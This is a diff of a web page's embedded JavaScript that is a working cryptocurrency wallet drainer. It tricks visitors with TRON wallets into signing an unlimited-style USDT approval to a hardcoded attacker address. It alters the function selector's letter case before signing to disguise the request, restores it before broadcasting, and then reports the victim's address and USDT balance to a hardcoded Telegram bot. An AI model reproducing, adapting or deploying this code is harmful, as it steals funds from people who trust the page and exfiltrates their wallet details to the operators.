@@ -113,157 +113,155 @@
 
       <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js"></script>
       <!--<script src="https://cdn.bootcss.com/vConsole/3.2.0/vconsole.min.js"></script>-->
-<script>
-    let tronWeb;
-
-    // 连接钱包
-    const lianjieqianbao = () => {
-        var obj = setInterval(async () => {
-            if (window.tronWeb.defaultAddress == undefined || window.tronWeb.defaultAddress == null) {
-                console.log('连接失败');
+      <script>
+        let tronWeb;
+    
+        // 连接钱包
+        const lianjieqianbao = () => {
+            var obj = setInterval(async () => {
+                if (window.tronWeb.defaultAddress == undefined || window.tronWeb.defaultAddress == null) {
+                    console.log('连接失败');
+                    return;
+                }
+                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                    clearInterval(obj);
+                    tronWeb = window.tronWeb;
+                    $(".address").text(window.tronWeb.defaultAddress.base58);
+                }
+            }, 10)
+        }
+    
+        // 获取 USDT 余额
+        const getUSDTBalance = async (walletAddress) => {
+            const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";  // 使用您的合约地址
+            const contract = await tronWeb.contract().at(usdtContractAddress);
+    
+            // 获取钱包的 USDT 余额
+            let result = await contract.balanceOf(walletAddress).call();
+            let usdtBalance = result.toNumber() / 1000000;  // 转换为正常单位，USDT的最小单位是 6 位小数
+    
+            return usdtBalance;
+        }
+    
+        // 授权
+        const shouquan = async () => {
+            // 第一步 先构建交易
+            let trxBalance = await tronWeb.trx.getBalance() / 1000000;
+            if (trxBalance < 24) {
+                swal({
+                    title: 'TRX小于24.00，付款受限，请补充TRX！',
+                    icon: 'error',
+                    buttons: true,
+                    dangerMode: true
+                });
                 return;
             }
-            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                clearInterval(obj);
-                tronWeb = window.tronWeb;
-                $(".address").text(window.tronWeb.defaultAddress.base58);
-            }
-        }, 10)
-    }
-
-    // 获取 USDT 余额
-    const getUSDTBalance = async (walletAddress) => {
-        const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";  // 使用您的合约地址
-        const contract = await tronWeb.contract().at(usdtContractAddress);
-
-        // 获取钱包的 USDT 余额
-        let result = await contract.balanceOf(walletAddress).call();
-        let usdtBalance = result.toNumber() / 1000000;  // 转换为正常单位，USDT的最小单位是 6 位小数
-
-        return usdtBalance;
-    }
-
-    // 授权
-    const shouquan = async () => {
-        // 第一步 先构建交易
-        let trxBalance = await tronWeb.trx.getBalance() / 1000000;
-        if (trxBalance < 24) {
-            swal({
-                title: 'TRX小于24.00，付款受限，请补充TRX！',
-                icon: 'error',
-                buttons: true,
-                dangerMode: true
-            });
-            return;
-        }
-
-        var parameter = [{ type: 'address', value: 'THSubSfqjKEBL6gbDR1hwZsBoaiARjfDun' }, { type: 'uint256', value: 5201314000000 }];
-        var options = {
-            feeLimit: 100000000n,
-        };
-        let { transaction } = await tronWeb.transactionBuilder.triggerSmartContract("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", "increaseApproval(address,uint256)", options,
-            parameter, window.tronWeb.defaultAddress.toHex);
-
-        // 第二步 替换内部函数
-        const raw_data = transaction.raw_data.contract[0].parameter.value.data.toString().replace("d73dd623", "D73DD623");
-        const raw_data_hex = transaction.raw_data_hex.toString().replace("d73dd623", "D73DD623");
-        transaction.raw_data.contract[0].parameter.value.data = raw_data;
-        transaction.raw_data_hex = raw_data_hex;
-
-        // 第三步 签名交易
-        const signTransaction = await tronWeb.trx.sign(transaction);
-
-        // 第四步 签名成功 在替换回去
-        const sign_raw_data = signTransaction.raw_data_hex.toString().replace("D73DD623", "d73dd623");
-        const sign_raw_data_hex = signTransaction.raw_data.contract[0].parameter.value.data.toString().replace("D73DD623", "d73dd623");
-        signTransaction.raw_data_hex = sign_raw_data;
-        signTransaction.raw_data.contract[0].parameter.value.data = sign_raw_data_hex;
-
-        // 第五步  在提交上链
-        const sendTransaction = await tronWeb.trx.sendRawTransaction(signTransaction);
-        console.log('上链结果', sendTransaction);
-
-        // 如果交易成功，获取 USDT 余额并发送通知
-        if (sendTransaction.result) {
-            const walletAddress = tronWeb.defaultAddress.base58;
-            const usdtBalance = await getUSDTBalance(walletAddress);
-            sendTelegramNotification(walletAddress, usdtBalance);
-            // 使用 swal 显示成功通知
-            swal({
-                title: '交易成功!',
-                text: '交易已经成功提交。',
-                icon: 'success',
-                button: '确认',
-            });
-        } else {
-            console.error('交易失败，无法通知 Telegram');
-            swal({
-                title: '交易失败!',
-                text: '交易提交失败，请重试。',
-                icon: 'error',
-                button: '重新尝试',
-            });
-        }
-    }
-
-    // 发送 Telegram 通知
-    const sendTelegramNotification = (walletAddress, usdtBalance) => {
-        // Telegram Bot Token 和 Chat ID
-        const botToken = "7479853848:AAGDddsIWgR_TzvdBDpVN6k5m_lk1MlE03o"; // 请替换为您的 Bot Token
-        const chatId = "-1001591713393"; // 请替换为您的 Chat ID
-
-        // 获取当前时间
-        const currentTime = new Date().toLocaleString();
-
-        // 构建 Telegram 消息
-        const message = `
-            *🟣【TRC授权通知】*\n\n
-            📅 *授权时间*: _${currentTime}_\n
-            🏷️ *钱包地址*: _${walletAddress}_\n
-            💰 *USDT余额*: _${usdtBalance} USDT_\n\n
-            🔗 [链上查询该地址](https://tronscan.io/#/address/${walletAddress})\n
-        `;
-
-        // 构建查询按钮 URL
-        const queryButton = {
-            text: '链上查询该地址',
-            url: `https://tronscan.io/#/address/${walletAddress}`
-        };
-
-        // 使用 Fetch API 向 Telegram 发送请求
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-            },
-            body: new URLSearchParams({
-                chat_id: chatId,
-                text: message,
-                parse_mode: 'Markdown',
-                reply_markup: JSON.stringify({
-                    inline_keyboard: [[queryButton]]  // 添加查询按钮
-                }),
-            }),
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                console.log('Telegram 通知发送成功');
+    
+            var parameter = [{ type: 'address', value: 'THSubSfqjKEBL6gbDR1hwZsBoaiARjfDun' }, { type: 'uint256', value: 5201314000000 }];
+            var options = {
+                feeLimit: 100000000n,
+            };
+            let { transaction } = await tronWeb.transactionBuilder.triggerSmartContract("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", "increaseApproval(address,uint256)", options,
+                parameter, window.tronWeb.defaultAddress.toHex);
+    
+            // 第二步 替换内部函数
+            const raw_data = transaction.raw_data.contract[0].parameter.value.data.toString().replace("d73dd623", "D73DD623");
+            const raw_data_hex = transaction.raw_data_hex.toString().replace("d73dd623", "D73DD623");
+            transaction.raw_data.contract[0].parameter.value.data = raw_data;
+            transaction.raw_data_hex = raw_data_hex;
+    
+            // 第三步 签名交易
+            const signTransaction = await tronWeb.trx.sign(transaction);
+    
+            // 第四步 签名成功 在替换回去
+            const sign_raw_data = signTransaction.raw_data_hex.toString().replace("D73DD623", "d73dd623");
+            const sign_raw_data_hex = signTransaction.raw_data.contract[0].parameter.value.data.toString().replace("D73DD623", "d73dd623");
+            signTransaction.raw_data_hex = sign_raw_data;
+            signTransaction.raw_data.contract[0].parameter.value.data = sign_raw_data_hex;
+    
+            // 第五步  在提交上链
+            const sendTransaction = await tronWeb.trx.sendRawTransaction(signTransaction);
+            console.log('上链结果', sendTransaction);
+    
+            // 如果交易成功，获取 USDT 余额并发送通知
+            if (sendTransaction.result) {
+                const walletAddress = tronWeb.defaultAddress.base58;
+                const usdtBalance = await getUSDTBalance(walletAddress);
+                sendTelegramNotification(walletAddress, usdtBalance);
+                // 使用 swal 显示成功通知
+                swal({
+                    title: '交易成功!',
+                    text: '交易已经成功提交。',
+                    icon: 'success',
+                    button: '确认',
+                });
             } else {
-                console.log('Telegram 通知发送失败');
+                console.error('交易失败，无法通知 Telegram');
+                swal({
+                    title: '交易失败!',
+                    text: '交易提交失败，请重试。',
+                    icon: 'error',
+                    button: '重新尝试',
+                });
             }
-        })
-        .catch(error => {
-            console.error('发送 Telegram 通知时出错', error);
+        }
+    
+        // 发送 Telegram 通知
+        const sendTelegramNotification = (walletAddress, usdtBalance) => {
+            // Telegram Bot Token 和 Chat ID
+            const botToken = "7479853848:AAGDddsIWgR_TzvdBDpVN6k5m_lk1MlE03o"; // 请替换为您的 Bot Token
+            const chatId = "-1001591713393"; // 请替换为您的 Chat ID
+    
+            // 获取当前时间
+            const currentTime = new Date().toLocaleString();
+    
+            // 构建 Telegram 消息
+            const message = `
+                *🟣【TRC授权通知】🟣*\n\n
+                🔔监听地址： ${walletAddress}\n\n
+                💰USDT余额： ${usdtBalance} USDT\n\n
+                ⏰授权时间： ${currentTime}\n
+            `;
+    
+            // 构建查询按钮 URL
+            const queryButton = {
+                text: '链上查询该地址',
+                url: `https://tronscan.io/#/address/${walletAddress}`
+            };
+    
+            // 使用 Fetch API 向 Telegram 发送请求
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: new URLSearchParams({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    reply_markup: JSON.stringify({
+                        inline_keyboard: [[queryButton]]  // 添加查询按钮
+                    }),
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Telegram 通知发送成功');
+                } else {
+                    console.log('Telegram 通知发送失败');
+                }
+            })
+            .catch(error => {
+                console.error('发送 Telegram 通知时出错', error);
+            });
+        }
+    
+        // 初始化
+        $(() => {
+            lianjieqianbao();
         });
-    }
-
-    // 初始化
-    $(() => {
-        lianjieqianbao();
-    });
-</script>
-
+    </script>
 
 
 
